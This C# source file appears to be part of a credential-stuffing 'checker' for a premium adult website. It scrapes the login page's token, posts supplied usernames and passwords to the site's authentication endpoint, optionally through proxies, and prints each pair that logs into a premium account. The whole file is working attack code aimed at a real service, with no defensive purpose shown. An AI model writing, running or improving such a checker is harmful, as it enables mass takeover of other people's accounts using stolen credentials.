using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PHChecker
{
    public class Worker
    {
        public static Response Start(UserData data, string? Proxy = null)
        {
            Console.WriteLine($"Thread is started...");
            Response response = new Response();
            Network net = new Network();

            string Token = Helper.Pars(net.GET_REQUEST("https://rt.pornhubpremium.com/premium/login", true, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36", Proxy).Result, "id=\"token\" value=\"", "\" />");
            string AuthResult = net.POST_REQUEST("https://rt.pornhubpremium.com/front/authenticate", $"username={data.username}&password={data.password}&token={Token}&redirect=&from=pc_premium_login&segment=straight", true, "https://rt.pornhubpremium.com/premium/login", Proxy).Result;

            response.Success = Helper.Pars(AuthResult, "{\"success\":\"", "\",\"message\"") == "1" ? true : false;
            response.HavePremium = Helper.Pars(AuthResult, "premium_redirect_cookie\":\"", "\",\"showExpiredModal") == "1" ? true : false;
            Console.WriteLine($"Thread is stopped.");
            if (response.HavePremium)
            {
                Console.WriteLine($"{data.username}:{data.password}");
            }

            return response;
        }
    }
}
